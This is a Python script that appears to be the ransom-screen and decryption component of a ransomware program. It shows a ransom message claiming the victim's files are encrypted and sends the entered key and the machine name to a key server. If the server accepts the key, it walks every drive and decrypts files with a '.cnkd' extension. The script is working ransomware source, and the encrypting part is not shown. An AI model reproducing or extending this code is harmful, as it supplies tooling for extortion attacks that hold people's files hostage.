import os
import string
from datetime import datetime, timedelta
import requests as rq
from dec import AESDecrypt
from colorama import Fore

driveletters=string.ascii_uppercase



msg=''' 
 ██████   ██████  ██████  ███████ ██ 
██    ██ ██    ██ ██   ██ ██      ██ 
██    ██ ██    ██ ██████  ███████ ██ 
██    ██ ██    ██ ██           ██    
 ██████   ██████  ██      ███████ ██ 
 '''

smsg="All of your personal files have been encrypted! In order to recieve your files back, you must insert the correct decryption key associated with your machine."







def diskdecrypt(decryptor):
    for let in driveletters:
        if os.path.exists(let+":\\"):
            for root, dirs, files in os.walk(let+":\\", topdown=False):
                for file in files:
                    curfile=os.path.join(root, file)
                    if"Windows" not in curfile:
                            if curfile.endswith(".cnkd"):
                                decryptor.decrypt_file(curfile)
                                
                    else:
                        pass
        else:
            pass


def main():
    ptime=datetime.now()+timedelta(days=7)
    exptime=str(ptime).split(".")[0]
    while True:
        print(Fore.RED+msg)
        print(smsg)


        key=input("\r\nenter key: ")
        data={
        "KEY":key,
        "CNAME":os.getenv("computername")
        }

        resp=rq.post("http://127.0.0.1:8000/decrypt", json=data)
        if resp.status_code==200:
            decryptor=AESDecrypt(key)
            diskdecrypt(decryptor)
        else:
            print("key not valid")
      

        
        
        

if __name__=="__main__":
    main()


        
